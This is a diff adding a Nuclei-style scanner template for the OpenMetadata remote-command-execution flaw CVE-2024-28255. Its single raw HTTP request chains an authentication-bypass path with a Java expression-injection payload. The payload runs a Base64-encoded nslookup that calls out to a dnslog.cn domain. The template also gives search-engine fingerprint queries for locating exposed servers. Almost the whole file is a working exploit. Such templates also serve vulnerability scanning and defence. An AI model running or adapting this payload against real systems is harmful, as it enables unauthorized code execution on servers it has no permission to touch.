@@ -1,0 +1,30 @@
+id: OpenMetadata_condition_RCE
+
+info:
+  name: OpenMetadata_condition_RCE
+  author: HK
+  severity: critical
+  description: OpenMetadata Command Execution(CVE-2024-28255)
+  metadata:
+    max-request: 1
+    Fofa-query: icon_hash="733091897"
+    Hunter-query: favicon:"bddc4a78d9b4cac667649f40a9fd25ac"
+    Quake-query: favicon:"bddc4a78d9b4cac667649f40a9fd25ac"
+    verified: true
+
+http:
+- raw:
+  - |+
+    GET /api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/T(java.lang.Runtime).getRuntime().exec(new%20java.lang.String(T(java.util.Base64).getDecoder().decode(%22bnNsb29rdXAgdGVzdC5kbnNsb2cuY24=%22))) HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
+    Connection: close
+    Accept-Encoding: gzip
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+      - java.lang.ProcessImpl
